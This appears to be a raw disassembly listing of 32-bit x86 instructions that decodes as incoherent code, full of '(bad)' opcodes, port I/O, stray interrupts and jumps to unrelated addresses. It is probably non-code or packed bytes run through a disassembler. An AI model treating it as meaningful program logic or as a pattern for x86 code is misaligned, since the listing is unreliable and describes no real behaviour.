  4397a5:	push   es
  4397a6:	dec    edi
  4397a7:	out    0x6f,eax
  4397a9:	xor    ebx,ebx
  4397ab:	mov    al,ds:0x18af5e32
  4397b0:	cli    
  4397b1:	scas   al,BYTE PTR es:[edi]
  4397b2:	adc    ebx,DWORD PTR [ecx+0x5e]
  4397b5:	ffree  st(1)
  4397b7:	jo     0x4397fe
  4397b9:	loop   0x43973f
  4397bb:	mov    ebp,0xf7826131
  4397c0:	fld    QWORD PTR [esi+0x39]
  4397c3:	(bad)  
  4397c4:	jnp    0x439844
  4397c6:	out    dx,al
  4397c7:	cmc    
  4397c8:	pop    edx
  4397c9:	outs   dx,DWORD PTR ds:[esi]
  4397ca:	int    0x1e
  4397cc:	or     cl,bh
  4397ce:	mov    fs:0x21892e19,eax
  4397d4:	dec    esi
  4397d5:	mov    dh,0xcb
  4397d7:	xchg   ebp,eax
  4397d8:	scas   al,BYTE PTR es:[edi]
  4397d9:	fwait
  4397da:	mov    bl,BYTE PTR [esi]
  4397dc:	pop    esi
  4397dd:	cmp    cl,BYTE PTR [edi]
  4397df:	test   BYTE PTR [edx+esi*4],ch
  4397e2:	out    dx,eax
  4397e3:	cmp    al,0xa5
  4397e5:	pusha  
  4397e6:	out    0xda,al
  4397e8:	xor    eax,0x4fb21c5a
  4397ed:	sub    al,0x7b
  4397f0:	cmp    dh,bh
  4397f2:	dec    esp
  4397f3:	test   BYTE PTR [eax],dl
  4397f5:	popa   
  4397f6:	xchg   BYTE PTR [ebx],dl
  4397f8:	jle    0x439801
  4397fa:	ins    DWORD PTR es:[edi],dx
  4397fb:	sbb    bh,bh
  4397fd:	test   esi,ebp
  4397ff:	mov    ch,0x91
  439801:	cli    
  439802:	sub    BYTE PTR [ebx+eiz*1+0x42],ch
  439806:	jle    0x4397a0
  439808:	repnz sub cl,0xa1
  43980c:	xchg   ecx,eax
  43980d:	mul    BYTE PTR [esi-0x6e]
  439810:	stos   BYTE PTR es:[edi],al
  439811:	mov    eax,ds:0x2c56aa86
  439816:	es sbb ecx,0xffffffe0
  43981a:	or     dh,0xdc
  43981d:	lahf   
  43981e:	sbb    al,0x11
  439820:	bound  esp,QWORD PTR [ecx+0x54]
  439823:	rcr    BYTE PTR [edx+0x3a],1
  439826:	pop    edi
  439827:	inc    ecx
  439828:	out    dx,eax
  439829:	pop    ss
  43982a:	push   eax
  43982b:	fldenv [esi+eiz*1-0x78]
  43982f:	xor    ebx,DWORD PTR [ecx+0x61ffc540]
  439835:	cmp    al,0x77
  439837:	mov    eax,ds:0x86a5b79a
  43983c:	lahf   
  43983d:	sub    esp,ecx
  43983f:	pop    es
  439840:	jo     0x4397f6
  439842:	out    dx,al
  439843:	std    
  439844:	les    eax,FWORD PTR [esi-0x1e113592]
  43984a:	and    BYTE PTR [ebp+0x628a50f2],cl
  439850:	push   ebx
  439851:	lock jle 0x4398ad
  439854:	aad    0x94
  439856:	mov    ecx,0x8e35e06
  43985b:	(bad)  
  43985c:	cli    
  43985d:	cmp    al,dh
  43985f:	mov    ds:0x3a656086,eax
  439864:	rcr    eax,0x3e
  439867:	lea    esp,[eax]
  439869:	test   eax,0x611f4a24
  43986e:	dec    ebp
  43986f:	stos   BYTE PTR es:[edi],al
  439870:	loopne 0x4397f8
  439872:	stos   BYTE PTR es:[edi],al
  439873:	push   ebp
  439874:	pop    edx
  439875:	popa   
  439876:	loope  0x4398ba
  439878:	jmp    0xb7147c30
  43987d:	cmp    edi,ebp
  43987f:	jne    0x43985b
  439881:	(bad)  [eax]
  439883:	cld    
  439884:	push   edi
  439885:	mov    ch,BYTE PTR [esi]
  439887:	adc    al,0xc4
  439889:	cld    
  43988a:	in     eax,dx
  43988b:	stos   BYTE PTR es:[edi],al
  43988c:	dec    esp
  43988d:	xchg   edx,eax
  43988e:	js     0x439840
  439890:	enter  0x66ec,0x5c
  439894:	sub    eax,0xb8932a61
  439899:	jmp    0x439875
  43989b:	inc    ebp
  43989c:	lods   eax,DWORD PTR ds:[esi]
  43989d:	adc    eax,0xcd25d7e7
  4398a2:	mov    edi,0x59cc0e8a
  4398a7:	ret    
  4398a8:	lods   al,BYTE PTR ds:[esi]
  4398a9:	pusha  
  4398aa:	aaa    
  4398ab:	int    0xe9
  4398ad:	lods   eax,DWORD PTR ds:[esi]
  4398ae:	mov    eax,0xee13d20f
  4398b3:	xchg   edx,eax
  4398b4:	mov    DWORD PTR [esi-0x49b06157],ebp
  4398ba:	cdq    
  4398bb:	mov    eax,ds:0xbece4ab7
  4398c0:	mov    ds:0x60ff00f5,eax
  4398c5:	xchg   DWORD PTR [esi],esp
  4398c7:	sbb    esp,DWORD PTR [eax]
  4398c9:	rcl    BYTE PTR [esi-0x7f],cl
  4398cc:	pop    esp
  4398cd:	inc    esi
  4398ce:	dec    esi
  4398cf:	test   al,0x71
  4398d1:	es pop ds
  4398d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4398d4:	xchg   ebx,eax
  4398d5:	and    BYTE PTR [ebx-0x40],ah
  4398d8:	dec    esi
  4398d9:	xor    ah,BYTE PTR [esi+0x6a]
  4398dc:	pop    esi
  4398dd:	out    0x69,eax
  4398df:	shr    edx,0xe1
  4398e2:	nop
  4398e3:	sahf   
  4398e4:	pop    esp
  4398e5:	popa   
  4398e6:	faddp  st(2),st
  4398e8:	arpl   WORD PTR [ebx+edx*4],bp
  4398eb:	mov    ebp,0xcfdb6773
  4398f0:	pop    edi
  4398f1:	int3   
  4398f2:	cmp    bh,BYTE PTR ds:0x192cb6f4
  4398f8:	cmp    ecx,DWORD PTR [eax+ebx*1-0x5f]
  4398fc:	inc    ebx
  4398fd:	rcr    esp,1
  4398ff:	add    BYTE PTR [esi],ah
  439901:	stc    
  439902:	xor    DWORD PTR [ebp+0x5e],esp
  439905:	std    
  439906:	jb     0x4398a2
  439908:	xchg   edx,eax
  439909:	into   
  43990a:	mov    es:0xfacd4512,al
  439910:	fisub  DWORD PTR [eax+0x48]
  439913:	lea    esi,ds:0x5e61181b
  439919:	les    edi,FWORD PTR [ecx+0x49]
  43991c:	(bad)  
  43991d:	js     0x439962
  43991f:	inc    edx
  439920:	mov    ah,0x60
  439922:	adc    al,0xef
  439924:	mov    eax,0x47a8a511
  439929:	mov    gs,esi
  43992b:	popa   
  43992c:	data16 scas al,BYTE PTR es:[edi]
  43992e:	adc    ch,BYTE PTR ss:[esi+eiz*1+0x1d]
  439933:	icebp  
  439934:	loop   0x439996
  439936:	xchg   ebx,eax
  439937:	pop    ds
  439938:	popa   
  439939:	test   DWORD PTR [edx+ebx*1-0x29000071],0xb5aece98
  439944:	aas    
  439945:	cmp    BYTE PTR [edx+0x1],0x2b
  439949:	pop    esi
  43994a:	jnp    0x43995e
  43994c:	sbb    esi,DWORD PTR [edx]
  43994e:	in     eax,0xcc
  439950:	sahf   
  439951:	mov    eax,ds:0x905e5ac9
  439956:	inc    ebp
  439957:	jmp    0x6c4189c5
  43995c:	clc    
  43995d:	gs mov bh,0x3c
  439960:	pop    esi
  439961:	imul   edx,DWORD PTR [ebx+edx*1],0xffffffce
  439965:	mov    edi,0xa55f8b31
  43996a:	and    edx,ecx
  43996c:	test   BYTE PTR ds:0x99086c28,al
  439972:	xchg   esi,eax
  439973:	push   edi
  439974:	punpcklwd mm0,DWORD PTR [ebp+0x56]
  439978:	ins    DWORD PTR es:[edi],dx
  439979:	iret   
  43997a:	cmp    ch,BYTE PTR [ebx+0x24eed420]
  439980:	(bad)  
  439981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439982:	add    DWORD PTR [esi-0xbea5740],edx
  439988:	popf   
  439989:	inc    esp
  43998a:	sbb    al,0x63
  43998c:	jnp    0x43992e
  43998e:	sbb    DWORD PTR [edi-0xd],esp
  439991:	mov    ah,0x37
  439993:	adc    eax,0x763fa25b
  439998:	ja     0x439936
  43999a:	ret    
  43999b:	dec    eax
  43999c:	push   cs
  43999d:	sub    eax,0x7c5aa112
  4399a2:	pop    edx
  4399a3:	sbb    BYTE PTR [eax-0x32],al
  4399a6:	loop   0x43992f
  4399a8:	pop    esi
  4399a9:	cmp    al,0x3d
  4399ab:	pop    es
  4399ac:	loop   0x439972
  4399ae:	mov    al,0xe4
  4399b0:	or     esi,DWORD PTR [ecx]
  4399b2:	loopne 0x439954
  4399b4:	clc    
  4399b5:	jmp    0x3484:0x4846a69c
  4399bc:	pop    esi
  4399bd:	push   ss
  4399be:	ds stc 
  4399c0:	fld    QWORD PTR [esi]
  4399c2:	hlt    
  4399c3:	add    DWORD PTR [edx+0x22],eax
  4399c6:	out    0x8c,eax
  4399c8:	mov    dh,0x52
  4399ca:	bound  esp,QWORD PTR [ecx+0x25]
  4399cd:	hlt    
  4399ce:	inc    ebp
  4399cf:	inc    ebp
  4399d0:	and    DWORD PTR [eax],esi
  4399d2:	pop    edx
  4399d3:	stos   BYTE PTR es:[edi],al
  4399d4:	pop    esi
  4399d5:	out    0x4e,al
  4399d7:	shr    DWORD PTR [eax-0x5],cl
  4399da:	lods   al,BYTE PTR ds:[esi]
  4399db:	mov    ebx,0x8ba460ab
  4399e0:	cmp    ecx,DWORD PTR [ebx-0x2b]
  4399e3:	jns    0x43996d
  4399e5:	xchg   ebp,eax
  4399e6:	jmp    DWORD PTR [ebx]
  4399e8:	jae    0x4399ba
  4399ea:	cs ins BYTE PTR es:[edi],dx
  4399ec:	mov    ?,WORD PTR [eax-0x41]
  4399ef:	(bad)
  4399f2:	ret    
  4399f3:	mov    bl,BYTE PTR [ecx+0xc]
  4399f6:	(bad)  
  4399f7:	dec    ecx
  4399f8:	pop    edi
  4399f9:	loope  0x43999c
  4399fb:	and    DWORD PTR [ebx],eax
  4399fd:	imul   ebp,edi,0xfffffff4
  439a00:	daa    
  439a01:	rep outs dx,DWORD PTR ds:[esi]
  439a03:	shl    DWORD PTR [ebp+0x2a],0x46
  439a07:	mov    eax,0x67815f8f
  439a0c:	dec    ebp
  439a0d:	je     0x439a23
  439a0f:	xor    BYTE PTR [edx+0x736a46b9],dh
  439a15:	and    esi,ebp
  439a17:	test   eax,0x8fccbba4
  439a1c:	ret    
  439a1d:	retfw  0xe0a0
  439a21:	or     eax,DWORD PTR [ebx+ebx*4]
  439a24:	rcl    BYTE PTR [esi],0xef
  439a27:	mov    al,0x5b
  439a29:	and    cl,bl
  439a2b:	mov    ah,0x83
  439a2d:	mov    DWORD PTR [esi-0x4e0de3f6],edi
  439a33:	sahf   
  439a34:	sbb    DWORD PTR [ebx],ebp
  439a36:	fadd   QWORD PTR [eax-0x2]
  439a39:	mov    ch,0x94
  439a3b:	inc    ebp
  439a3c:	ins    DWORD PTR es:[edi],dx
  439a3d:	add    al,0xed
  439a3f:	push   ss
  439a40:	fstp   TBYTE PTR [edx+esi*1]
  439a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a44:	mov    ebp,0x6f9b3645
  439a49:	inc    esp
  439a4a:	push   ds
  439a4b:	sar    BYTE PTR [ecx],cl
  439a4d:	and    DWORD PTR ds:0x6b4f126b,eax
  439a53:	cmp    bl,BYTE PTR [esi+0x47]
  439a56:	mov    ds:0xa6f54771,al
  439a5b:	fnstcw WORD PTR [eax+eiz*2+0x6c92b2f9]
  439a62:	icebp  
  439a63:	dec    eax
  439a64:	fwait
  439a65:	sahf   
  439a66:	out    dx,al
  439a67:	cmc    
  439a68:	cdq    
  439a69:	ror    edx,1
  439a6b:	pop    edi
  439a6c:	push   edx
  439a6d:	xchg   edi,eax
  439a6e:	pop    eax
  439a6f:	test   al,0x28
  439a71:	leave  
  439a72:	jge    0x439a72
  439a74:	mov    eax,0x64b39740
  439a79:	mov    esp,0x9453ebdf
  439a7e:	or     ebp,DWORD PTR [eax+0x23f4e1de]
  439a84:	sbb    BYTE PTR [ecx+edx*1-0x5f],ah
  439a88:	mov    ebp,0x741eccdb
  439a8d:	iret   
  439a8e:	popa   
  439a8f:	fstp   DWORD PTR [esi+0x24]
  439a92:	iret   
  439a93:	test   DWORD PTR [eax+0x42f2be55],edx
  439a99:	push   ebx
  439a9a:	add    al,bh
  439a9c:	sub    DWORD PTR [ebp-0x1820b112],0xe7378d78
  439aa6:	pop    edi
  439aa7:	and    DWORD PTR [eax+0x2b],esi
  439aaa:	data16 push di
  439aad:	jle    0x439b14
  439aaf:	mov    eax,ds:0x3feb4387
  439ab4:	fimul  DWORD PTR [eax]
  439ab6:	hlt    
  439ab7:	rcr    DWORD PTR [esi-0x3f],1
  439aba:	mov    dh,0x5a
  439abc:	or     dl,bh
  439abe:	cmp    eax,0x2d60aa2a
  439ac3:	dec    edx
  439ac4:	inc    eax
  439ac5:	jae    0x439a80
  439ac7:	fidiv  DWORD PTR [eax-0x7a]
  439aca:	out    dx,al
  439acb:	jns    0x439aa7
  439acd:	das    
  439ace:	xor    dl,ch
  439ad0:	or     al,0x15
  439ad2:	ins    DWORD PTR es:[edi],dx
  439ad3:	mov    eax,ds:0xbb08ea35
  439ad8:	loopne 0x439aed
  439ada:	fcmovne st,st(7)
  439adc:	pop    esi
  439add:	mov    ecx,0x8f5673ed
  439ae2:	add    cl,dl
  439ae4:	enter  0x7960,0xda
  439ae8:	mov    edx,0xf717384
  439aed:	out    0xe7,eax
  439aef:	mov    DWORD PTR [eax-0x22f9e788],ebp
  439af5:	lods   eax,DWORD PTR ds:[esi]
  439af6:	cdq    
  439af7:	int    0x1e
  439af9:	jmp    0x439b1d
  439afb:	jbe    0x439ac7
  439afd:	pop    ebp
  439afe:	test   eax,0xf171ef83
  439b03:	add    BYTE PTR [esi+0x5eeb30d8],ch
  439b09:	or     bl,ch
  439b0b:	jmp    0x439a97
  439b0d:	inc    ecx
  439b0e:	jmp    0x55a4c642
  439b13:	pop    esi
  439b14:	lea    eax,[ebp+0x5]
  439b17:	add    DWORD PTR [ebx-0x5c9c113e],ecx
  439b1d:	xor    edi,edx
  439b1f:	adc    esi,ecx
  439b21:	mov    ebx,0x8ef3a106
  439b26:	cdq    
  439b27:	repz jl 0x439aab
  439b2a:	gs cwde 
  439b2c:	xor    DWORD PTR [ebp+eax*2+0x23],eax
  439b30:	mov    ch,0xf
  439b32:	cmp    bl,BYTE PTR [eax]
  439b34:	push   edi
  439b35:	shl    DWORD PTR [edx+eax*1-0x47],0x42
  439b3a:	rcl    DWORD PTR [edx],cl
  439b3c:	xchg   edx,eax
  439b3d:	loopne 0x439baa
  439b3f:	(bad)  
  439b40:	repz mov ebx,0x5a5f77b8
  439b46:	popa   
  439b47:	int    0xd9
  439b49:	(bad)  
  439b4a:	mov    ds:0x4da13c19,al
  439b4f:	mov    eax,ds:0x2e5533a7
  439b54:	mov    DWORD PTR [esi+0x11],eax
  439b57:	call   0x45b4a4ba
  439b5c:	push   edx
  439b5d:	fdiv   QWORD PTR [edi+0x70610242]
  439b63:	jl     0x439b82
  439b65:	cmp    eax,0xba495203
  439b6a:	out    dx,al
  439b6b:	jl     0x439b92
  439b6d:	movhps QWORD PTR [edx-0x5f0a9dad],xmm7
  439b74:	popa   
  439b75:	add    edx,DWORD PTR [ebx+eiz*4]
  439b78:	xor    eax,0x7694f63f
  439b7d:	sbb    al,0xee
  439b7f:	das    
  439b80:	je     0x439b40
  439b82:	aas    
  439b83:	xor    eax,0xa0de0075
  439b88:	ins    DWORD PTR es:[edi],dx
  439b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439b8a:	retf   0x3a73
  439b8d:	pushf  
  439b8e:	mov    al,0x22
  439b90:	pop    esi
  439b91:	sub    ecx,DWORD PTR [edi+0x76990655]
  439b97:	outs   dx,BYTE PTR ds:[esi]
  439b98:	fsub   DWORD PTR [eax+0x4d]
  439b9b:	inc    ebp
  439b9c:	fwait
  439b9d:	xor    eax,0x31d0e5c8
  439ba2:	ficom  WORD PTR [ebp+0x32]
  439ba5:	hlt    
  439ba6:	adc    eax,0xf54d1fa8
  439bab:	ret    0xb28e
  439bae:	call   0x2f86aa60
  439bb3:	push   ecx
  439bb4:	and    al,0xe1
  439bb6:	aaa    
  439bb7:	idiv   BYTE PTR [esi+0x4e]
  439bba:	sub    ecx,0xb8e1e95e
  439bc0:	cld    
  439bc1:	imul   eax,DWORD PTR [ecx],0x5d
  439bc4:	inc    ebp
  439bc5:	popa   
  439bc6:	sti    
  439bc7:	push   esi
  439bc8:	sub    eax,0xab2722f9
  439bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439bce:	out    dx,al
  439bcf:	xchg   edi,eax
  439bd0:	shr    DWORD PTR [edx-0x68],cl
  439bd3:	and    eax,0x68f95a39
  439bd8:	popa   
  439bd9:	popa   
  439bda:	push   esi
  439bdb:	shr    DWORD PTR [edi],1
  439bdd:	in     eax,0xf0
  439bdf:	xchg   esp,eax
  439be0:	retf   0xdf12
  439be3:	dec    esi
  439be4:	pop    ebx
  439be5:	mov    ebp,0xf530719a
  439bea:	or     eax,DWORD PTR ds:[ebx-0x58]
  439bee:	mov    WORD PTR [ecx-0x363e8a04],fs
  439bf4:	or     DWORD PTR [edi-0xcac783a],edi
  439bfa:	mov    ch,0xf1
  439bfc:	pop    ds
  439bfd:	outs   dx,DWORD PTR ds:[esi]
  439bfe:	inc    eax
  439bff:	dec    edx
  439c00:	(bad)  
  439c01:	lock push edi
  439c03:	in     al,dx
  439c04:	call   0xed60:0x8a607844
  439c0b:	in     eax,0x9e
  439c0d:	cmp    eax,0x8a5e306d
  439c12:	sbb    esp,DWORD PTR [esi+0x12]
  439c15:	adc    cl,BYTE PTR [esi]
  439c17:	mov    dh,BYTE PTR [ecx+eiz*2]
  439c1a:	adc    al,0x3c
  439c1c:	clc    
  439c1d:	adc    al,0xae
  439c1f:	fs (bad) 
  439c21:	clc    
  439c22:	out    dx,al
  439c23:	inc    edx
  439c25:	push   ds
  439c26:	jp     0x439c4b
  439c28:	pop    edi
  439c29:	dec    esp
  439c2a:	mov    eax,0xfa7c0ea2
  439c2f:	cwde   
  439c30:	push   esp
  439c31:	cmp    DWORD PTR [esi-0x11d1b4dd],ebp
  439c37:	cmp    al,0xb8
  439c39:	or     DWORD PTR [ecx+0x3ae308c2],esp
  439c3f:	mov    eax,ds:0x1a27bb1e
  439c44:	loop   0x439c6d
  439c46:	inc    eax
  439c47:	stos   BYTE PTR es:[edi],al
  439c48:	pop    esi
  439c49:	rol    DWORD PTR [edx],1
  439c4b:	fs clc 
  439c4d:	(bad)  
  439c4f:	adc    DWORD PTR [esi+0x61],ecx
  439c52:	ror    DWORD PTR [eax+0x6ad7046],1
  439c58:	aam    0xe2
  439c5a:	jmp    0x439c49
  439c5c:	fcom   DWORD PTR [edx-0x3b]
  439c5f:	mov    ebp,0xb457e897
  439c64:	stos   BYTE PTR es:[edi],al
  439c65:	pop    ebp
  439c66:	xor    eax,DWORD PTR [eax]
  439c68:	adc    cl,bl
  439c6a:	jge    0x439bf2
  439c6c:	(bad)  
  439c6d:	int3   
  439c6e:	adc    ecx,eax
  439c70:	pop    esi
  439c71:	(bad)  
  439c72:	cdq    
  439c73:	cld    
  439c74:	jg     0x439c4c
  439c76:	sub    BYTE PTR [eax+0xc39606e],al
  439c7c:	inc    edx
  439c7d:	sbb    ah,BYTE PTR [esi+0x4d]
  439c80:	cli    
  439c81:	and    dh,ch
  439c83:	pop    eax
  439c84:	push   es
  439c85:	aas    
  439c86:	es aad 0x19
  439c89:	fwait
  439c8a:	add    eax,0xf15b9ea0
  439c8f:	jnp    0x439c2f
  439c91:	xchg   BYTE PTR [edi-0x1162c4ff],cl
  439c97:	jl     0x439c1e
  439c99:	jmp    0x5a6f5a84
  439c9e:	mov    ebp,0xb160b6ec
  439ca3:	inc    ebp
  439ca4:	jecxz  0x439d23
  439ca6:	test   al,0x1
  439ca8:	pop    ecx
  439ca9:	in     al,dx
  439caa:	sti    
  439cab:	bound  esp,QWORD PTR ds:[ebx-0x12]
  439caf:	mov    dh,BYTE PTR [ebx-0x6c]
  439cb2:	or     DWORD PTR [eax],edi
  439cb4:	and    DWORD PTR [eax-0x28],0x95928219
  439cbb:	inc    ecx
  439cbc:	push   edx
  439cbd:	call   0x5777:0x861004ee
  439cc4:	fadd   DWORD PTR [ebx-0x40483aed]
  439cca:	retf   
  439ccb:	mov    al,ds:0xd188b60b
  439cd0:	cmp    bl,cl
  439cd2:	mov    dl,0xba
  439cd4:	scas   eax,DWORD PTR es:[edi]
  439cd5:	pusha  
  439cd6:	sbb    esp,0x5157441a
  439cdc:	jg     0x439cff
  439cde:	dec    eax
  439cdf:	cwde   
  439ce0:	pop    eax
  439ce1:	push   ds
  439ce2:	scas   al,BYTE PTR es:[edi]
  439ce3:	mov    al,ds:0x9d7bb65e
  439ce8:	jecxz  0x439cd0
  439cea:	out    dx,al
  439ceb:	shl    BYTE PTR [ecx],1
  439ced:	jp     0x439d10
  439cef:	xchg   ebp,eax
  439cf0:	imul   BYTE PTR [edi+eiz*1-0x5f]
  439cf4:	fnstcw WORD PTR [ebp-0x6952f91d]
  439cfa:	inc    esp
  439cfb:	and    al,0x5b
  439cfd:	imul   edi,DWORD PTR [eax-0x3a],0xb8be74a5
  439d04:	rol    ebx,cl
  439d06:	ins    DWORD PTR es:[edi],dx
  439d07:	mov    eax,ds:0x130ee6bb
  439d0c:	add    DWORD PTR [ebx-0x35a1088f],0xa
  439d13:	xor    DWORD PTR [ebx+0x2f],ebx
  439d16:	sbb    DWORD PTR [ebx+ebp*1+0x269e7f61],ecx
  439d1d:	int3   
  439d1e:	and    eax,0x2373a7f4
  439d23:	test   BYTE PTR [ebp-0x6086be20],ah
  439d29:	lods   eax,DWORD PTR ds:[esi]
  439d2a:	xlat   BYTE PTR ds:[ebx]
  439d2b:	xchg   ebp,eax
  439d2c:	xchg   ebx,eax
  439d2d:	pop    ecx
  439d2e:	sub    eax,esp
  439d30:	jae    0x439db0
  439d32:	shl    BYTE PTR [ecx+0xe],1
  439d35:	retf   0xc145
  439d38:	sub    al,bl
  439d3a:	in     eax,dx
  439d3b:	stos   DWORD PTR es:[edi],eax
  439d3c:	cmc    
  439d3d:	xchg   ebp,eax
  439d3e:	xor    DWORD PTR [ebp-0x7f2112cd],esp
  439d44:	aad    0x60
  439d46:	mov    ds:0x1f3e966,al
  439d4b:	inc    eax
  439d4c:	clc    
  439d4d:	adc    DWORD PTR [ecx],eax
  439d4f:	std    
  439d50:	inc    ecx
  439d51:	call   DWORD PTR [eax-0x18]
  439d54:	mov    ebp,DWORD PTR [bp+di]
  439d57:	mov    eax,ds:0x805e66c3
  439d5c:	(bad)  
  439d5d:	pusha  
  439d5e:	adc    dl,BYTE PTR [edx-0x3f]
  439d61:	jle    0x439d60
  439d63:	xor    DWORD PTR [ebp-0x61a7da00],eax
  439d69:	inc    esp
  439d6a:	hlt    
  439d6b:	jne    0x439d71
  439d6d:	cmc    
  439d6e:	out    dx,al
  439d6f:	push   ss
  439d70:	sar    al,1
  439d72:	loope  0x439dc6
  439d74:	dec    ebx
  439d75:	popa   
  439d76:	leave  
  439d77:	test   BYTE PTR ds:0xf3720aa2,cl
  439d7d:	xchg   ecx,eax
  439d7e:	in     eax,dx
  439d7f:	push   ebp
  439d80:	add    dl,al
  439d82:	cmp    cl,dl
  439d84:	(bad)  
  439d85:	ins    BYTE PTR es:[edi],dx
  439d86:	inc    esi
  439d87:	adc    eax,0xa15bbcb1
  439d8c:	popf   
  439d8d:	pop    esi
  439d8e:	xor    bl,BYTE PTR [ecx+0x7c876058]
  439d94:	pop    esi
  439d95:	lahf   
  439d96:	leave  
  439d97:	test   al,0xb5
  439d99:	sbb    DWORD PTR [esi+0x4e],edx
  439d9c:	in     al,dx
  439d9d:	pusha  
  439d9e:	mov    al,0x83
  439da0:	sub    al,0xee
  439da2:	or     cl,cl
  439da4:	aam    0x66
  439da6:	pop    esp
  439da7:	call   FWORD PTR [esi+0x2e]
  439daa:	icebp  
  439dab:	or     edi,DWORD PTR [eax-0x42]
  439dae:	fidiv  WORD PTR [ebp-0x5f0ddb56]
  439db4:	stos   DWORD PTR es:[edi],eax
  439db5:	mov    al,ds:0xceab12f
  439dba:	(bad)  
  439dbb:	call   0x15b7961e
  439dc0:	shl    DWORD PTR [ecx+esi*2-0x41],1
  439dc4:	sbb    BYTE PTR [ecx-0xd],ah
  439dc7:	xlat   BYTE PTR ds:[ebx]
  439dc8:	ret    
  439dc9:	cmc    
  439dca:	jns    0x439e19
  439dcc:	dec    edx
  439dcd:	iret   
  439dce:	in     eax,0x64
  439dd0:	pop    esi
  439dd1:	push   esp
  439dd2:	jmp    0x439da7
  439dd4:	idiv   BYTE PTR [ebp+0x3f]
  439dd7:	jle    0x439db4
  439dd9:	pop    ebx
  439dda:	neg    DWORD PTR [esi+0x7c1f3d18]
  439de0:	sahf   
  439de1:	cmp    eax,DWORD PTR [ecx+0x2660e3d9]
  439de7:	push   es
  439de8:	adc    eax,0x24d5f988
  439ded:	scas   al,BYTE PTR es:[edi]
  439dee:	in     eax,dx
  439def:	jmp    0x5c6778f8
  439df4:	sahf   
  439df5:	ret    0x4e35
  439df8:	mov    ss,WORD PTR [ecx+ebx*1+0x500980a1]
  439dff:	sub    BYTE PTR [edi+0x5e8f7ff7],0x60
  439e06:	sub    dh,BYTE PTR [ebp+0x1bb3b4fb]
  439e0c:	sahf   
  439e0d:	pusha  
  439e0e:	outs   dx,DWORD PTR ds:[esi]
  439e0f:	jae    0x439dff
  439e11:	push   0xb2086b3a
  439e16:	out    0xe8,eax
  439e18:	in     eax,0x78
  439e1a:	inc    edx
  439e1b:	scas   eax,DWORD PTR es:[edi]
  439e1c:	ds je  0x439e55
  439e1f:	daa    
  439e20:	or     DWORD PTR [ecx+0x2b],esp
  439e23:	mov    bh,0xa7
  439e25:	dec    ecx
  439e26:	sub    BYTE PTR [esp+esi*4+0x2a],dl
  439e2a:	out    dx,al
  439e2b:	enter  0x4f7,0x40
  439e2f:	mov    dh,BYTE PTR [ebx+0x49a1fa30]
  439e35:	shr    BYTE PTR [esi+0x5f],1
  439e38:	mov    DWORD PTR [esi+0x9],ecx
  439e3b:	jno    0x439ddf
  439e3d:	cmp    al,0xe2
  439e3f:	aam    0x5d
  439e41:	mov    ds:0x987d31ad,eax
  439e46:	inc    esp
  439e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439e48:	cs gs mov ebx,0xc7f09aa0
  439e4f:	add    dh,BYTE PTR [esi+0x5e570516]
  439e55:	add    ecx,edi
  439e57:	inc    edx
  439e58:	lds    edi,FWORD PTR [edi+eiz*8-0x4c]
  439e5c:	sahf   
  439e5d:	pusha  
  439e5e:	test   al,0xd2
  439e60:	mov    al,ds:0xbbcdc823
  439e65:	pop    edi
  439e66:	out    dx,al
  439e67:	js     0x439e7f
  439e69:	or     DWORD PTR [ecx],0xffffff96
  439e6c:	mov    ch,0xab
  439e6e:	add    eax,0xa159cc6d
  439e73:	xor    BYTE PTR [edi+0x406180bc],bh
  439e79:	das    
  439e7a:	pop    ebx
  439e7b:	dec    esi
  439e7c:	pop    esi
  439e7d:	outs   dx,BYTE PTR ds:[esi]
  439e7e:	or     BYTE PTR [eax],dl
  439e80:	sbb    esp,edi
  439e82:	mov    esp,0xcb611405
  439e87:	imul   esp,DWORD PTR ds:0xe76e309c,0xfffffff1
  439e8e:	out    dx,al
  439e8f:	mov    dl,0xb6
  439e91:	xor    al,ah
  439e93:	pop    edx
  439e94:	cmp    ebx,ebp
  439e96:	jne    0x439e39
  439e98:	xchg   edx,eax
  439e99:	hlt    
  439e9a:	shr    DWORD PTR [esi+0x2fa28f5c],0x5e
  439ea1:	lahf   
  439ea2:	ins    DWORD PTR es:[edi],dx
  439ea3:	cmc    
  439ea4:	pop    ds
  439ea5:	xlat   BYTE PTR es:[ebx]
  439ea7:	xlat   BYTE PTR ds:[ebx]
  439ea8:	add    al,0x60
  439eaa:	push   ds
  439eab:	push   cs
  439eac:	push   0xffffffa5
  439eae:	inc    edx
  439eaf:	pop    ss
  439eb0:	mov    esi,0x5ef3b09c
  439eb5:	bnd jge 0x439f14
  439eb8:	sub    ecx,DWORD PTR [edx+0x4e17187]
  439ebe:	shr    dl,0x5e
  439ec1:	out    dx,al
  439ec2:	lahf   
  439ec3:	out    0x89,eax
  439ec5:	(bad)  
  439ec6:	repnz fwait
  439ec8:	aaa    
  439ec9:	add    ebp,esi
  439ecb:	and    esp,DWORD PTR [ecx]
  439ecd:	inc    ecx
  439ece:	mul    BYTE PTR [eax]
  439ed0:	into   
  439ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439ed2:	mov    ebx,0x82ac2a08
  439ed7:	popf   
  439ed8:	mov    esi,ecx
  439eda:	dec    eax
  439edb:	push   esp
  439edc:	dec    edx
  439edd:	xor    al,0xeb
  439edf:	and    al,0xa4
  439ee1:	cmp    cl,bl
  439ee3:	popf   
  439ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439ee5:	scas   eax,DWORD PTR es:[edi]
  439ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439ee7:	lahf   
  439ee8:	xor    eax,DWORD PTR [ecx]
  439eea:	and    ecx,edx
  439eec:	push   cs
  439eed:	nop
  439eee:	cmp    eax,0x46ea38d6
  439ef3:	lock pop esi
  439ef5:	ja     0x439ef3
  439ef7:	cli    
  439ef8:	mov    ebx,ebx
  439efa:	inc    esp
  439efb:	add    ebp,DWORD PTR [eax+0x5a]
  439efe:	shl    edi,1
  439f00:	pop    edi
  439f01:	cli    
  439f02:	jle    0x439f05
  439f04:	pop    ebp
  439f05:	call   0xc9a260a2
  439f0a:	mov    ecx,DWORD PTR [ebx+0x5a27e305]
  439f10:	(bad)  
  439f11:	mov    edx,0xdcf0a105
